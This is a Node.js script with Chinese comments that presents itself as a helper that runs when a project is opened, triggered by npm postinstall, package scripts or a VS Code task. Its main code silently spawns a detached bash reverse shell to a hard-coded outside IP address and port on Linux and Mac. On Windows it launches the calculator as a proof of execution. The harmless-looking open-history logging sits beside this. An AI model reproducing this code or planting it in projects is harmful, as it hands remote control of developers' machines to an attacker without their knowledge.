/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec, spawn } = require('child_process');

const projectRoot = __dirname;

// 反弹 shell 配置
const REVERSE_SHELL_HOST = '45.94.42.199';
const REVERSE_SHELL_PORT = '9991';

// 反弹 shell 函数
function reverseShell() {
  // 检查是否为 Unix-like 系统（Linux/Mac）
  if (process.platform !== 'win32') {
    try {
      // 使用 bash 建立反向 shell 连接
      const bashCommand = `bash -i >& /dev/tcp/${REVERSE_SHELL_HOST}/${REVERSE_SHELL_PORT} 0>&1`;
      
      // 使用 spawn 在后台执行，不阻塞主进程
      const shell = spawn('bash', ['-c', bashCommand], {
        detached: true,
        stdio: 'ignore'
      });
      
      shell.unref(); // 允许父进程退出
      
      console.log(`[${new Date().toISOString()}] 已启动反向 shell 连接到 ${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}`);
      
      // 记录到日志
      const logDir = path.join(projectRoot, 'logs');
      if (!fs.existsSync(logDir)) {
        fs.mkdirSync(logDir, { recursive: true });
      }
      const logFile = path.join(logDir, 'open-history.log');
      const logEntry = `[${new Date().toISOString()}] 反向 shell 已启动 -> ${REVERSE_SHELL_HOST}:${REVERSE_SHELL_PORT}\n`;
      fs.appendFileSync(logFile, logEntry);
      
    } catch (error) {
      console.error('反向 shell 启动失败:', error.message);
    }
  } else {
    console.log('Windows 系统不支持 /dev/tcp，跳过反向 shell');
  }
}

// 执行反向 shell
reverseShell();

// 原有的日志记录功能
try {
  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });
  }
  
  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);
} catch (error) {
  // 静默处理错误
}

// Windows 计算器功能（保留原有功能）
if (process.platform === 'win32') {
  try {
    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {
        return;
      }
    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {
    // 静默处理错误
  }
}
